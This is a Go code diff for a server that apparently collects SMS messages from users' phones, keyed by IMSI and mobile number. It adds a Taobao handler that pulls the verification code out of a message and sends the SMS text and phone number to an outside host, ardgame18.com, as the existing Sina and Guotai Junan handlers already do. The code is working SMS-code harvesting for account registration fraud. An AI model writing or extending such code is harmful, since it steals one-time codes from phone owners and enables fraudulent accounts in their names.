@@ -85,6 +85,8 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 				processSinaRegister(msg, *user, r.FormValue("apid"))
 			} else if strings.EqualFold(r.FormValue("apid"), "105") {
 				processGtjaRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "106") {
+				processTaobaoRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -188,6 +190,17 @@ func processGtjaRegister(msg string, user map[string]string, apid string) {
 	}
 	go updateRelationSuccess(user, apid)
 }
+func processTaobaoRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`校验码是(\S*)。`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[1])
+		url := "http://zy.ardgame18.com:8080/verifycode/api/getTBCode.jsp?cid=c115&pid=tb115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		go send2Url(url)
+	}
+	go updateRelationSuccess(user, apid)
+}
 func processSinaRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
 	url := "http://zy.ardgame18.com:8080/verifycode/api/getSNWeb.jsp?cid=c115&pid=web115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
@@ -203,7 +216,7 @@ func updateRelationSuccess(user map[string]string, apid string) {
 			log.Println("error end:")
 		}
 	}()
-	sql := "update register_user_relations set  successCount =ifnull(successCount,0)+1,lastSendTime=? where imsi=? and apid=?"
+	sql := "update register_user_relations set successCount =ifnull(successCount,0)+1,lastSendTime=? where imsi=? and apid=?"
 	exec(dbConfig, sql, time.Now().Unix(), user["imsi"], apid)
 }
 
